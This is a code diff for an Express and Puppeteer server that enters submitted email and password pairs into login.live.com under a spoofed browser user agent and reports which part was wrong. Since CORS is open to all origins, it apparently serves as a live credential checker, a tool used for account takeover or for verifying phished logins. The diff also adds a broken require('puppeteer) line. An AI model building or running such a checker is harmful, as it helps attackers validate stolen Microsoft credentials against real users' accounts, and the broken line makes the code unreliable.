@@ -1,23 +1,19 @@
 const express = require('express');
-const puppeteer = require('puppeteer');
-const cors = require('cors'); // Import the CORS package
+const puppeteer = require('puppeteer);
+const cors = require('cors');
 
 const app = express();
 app.use(express.json()); // To parse JSON bodies
-app.use(cors()); // Enable CORS globally
+app.use(cors());
 
 let browser; // Keep a reference to the browser instance
+let page; // Keep a reference to the page instance
 
 async function loginLive(email, password) {
-    const page = await browser.newPage();
-    console.log('New page created');
+    if (!page) {
+        throw new Error('Page not initialized');
+    }
 
-    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36');
-    await page.setViewport({ width: 1280, height: 800 });
-
-    await page.goto('https://login.live.com', { waitUntil: 'networkidle2' });
-    console.log('Navigated to login.live.com');
-    
     // Enter email
     await page.type('input[name="loginfmt"]', email);
     console.log('Email entered');
@@ -31,7 +27,9 @@ async function loginLive(email, password) {
     try {
         await page.waitForSelector('div#i0116Error', { visible: true, timeout: 5000 });
         console.log('Incorrect email detected');
-        await page.close(); // Close the page
+        await page.goto('https://login.live.com');
+        console.log('redirected to login.live');
+
         return { success: false, message: 'Incorrect email' };
     } catch (error) {
         console.log('Email appears to be correct, proceeding...');
@@ -50,21 +48,26 @@ async function loginLive(email, password) {
     try {
         await page.waitForSelector('div#i0118Error', { visible: true, timeout: 5000 });
         console.log('Incorrect password detected');
-        await page.close(); // Close the page
+        await page.goto('https://login.live.com');
+        console.log('redirected to login.live');
+        
         return { success: false, message: 'Incorrect password' };
     } catch (error) {
         console.log('Password appears to be correct, proceeding...');
     }
 
-    // Handle "Stay signed in?" prompt
+    await page.close(); // Close the page after login
+    return { success: true };
+
+    /* // Handle "Stay signed in?" prompt
     console.log('Waiting for "Stay signed in" button');
     await page.waitForSelector('button#declineButton', { visible: true, timeout: 10000 });
     await page.click('button#declineButton');
     console.log('Clicked Stay signed in');
 
     await page.close(); // Close the page after login
-    return { success: true };
-}
+    return { success: true }; */
+} 
 
 async function startBrowser() {
     browser = await puppeteer.launch({
@@ -73,6 +76,15 @@ async function startBrowser() {
         args: ['--no-sandbox']
     });
     console.log('Browser launched');
+
+    page = await browser.newPage();
+    console.log('New page created');
+
+    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36');
+    await page.setViewport({ width: 1280, height: 800 });
+
+    await page.goto('https://login.live.com', { waitUntil: 'networkidle2' });
+    console.log('Navigated to login.live.com');
 }
 
 // Route to handle login requests
